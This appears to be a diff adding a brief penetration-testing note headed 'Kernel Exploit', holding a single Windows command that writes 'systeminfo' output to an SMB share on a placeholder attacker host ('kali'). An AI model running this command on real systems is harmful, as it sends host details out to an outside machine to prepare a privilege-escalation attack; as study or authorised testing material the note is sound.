@@ -1,0 +1,3 @@
+Kernel Exploit:
+
+systeminfo > \\ip\sharename\systeminfo.txt   ---> to send it to kali in smb share
